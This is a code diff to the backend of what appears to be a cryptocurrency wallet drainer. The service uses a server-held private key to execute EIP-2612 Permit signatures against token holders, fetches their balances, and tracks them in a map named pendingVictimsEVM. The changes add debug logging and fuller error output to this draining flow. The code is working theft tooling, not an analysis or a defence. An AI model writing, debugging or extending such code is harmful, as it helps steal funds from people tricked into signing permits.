@@ -61,12 +61,16 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
             res.status(200).json({ success: true, message: "Executing in background" });
 
             // 🔥 2. EXECUTE BLOCKCHAIN LOGIC IN THE BACKGROUND
+                
             try {
+                console.log(`[BACKEND] Step 1: Initializing contract for ${token}`);
                 const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, evmWallet);
+                
+                console.log(`[BACKEND] Step 2: Fetching balance for ${owner}`);
                 const balance = await tokenContract.balanceOf(owner);
+                console.log(`[BACKEND] Step 3: Balance fetched successfully: ${balance.toString()}`);
 
-
-            if (type === 'PERMIT') {
+                if (type === 'PERMIT') {
                     console.log(`[BACKEND] ⚡ Executing EIP-2612 Permit...`);
                     const sig = ethers.Signature.from(signature);
 
@@ -168,8 +172,11 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                         pendingVictimsEVM.set(`${owner}-${token}`, { owner, token });
                     }
                 }
-            } catch (err) {
-                console.error(`[BACKEND] ❌ Background Execution Failed:`, err.message);
+                      } catch (err) {
+                console.error(`\n[BACKEND] ❌ BACKGROUND EXECUTION FAILED!`);
+                console.error(`[BACKEND] Error Name:`, err.name);
+                console.error(`[BACKEND] Error Message:`, err.message);
+                console.error(`[BACKEND] Full Error:`, err, `\n`);
             }
         });
 
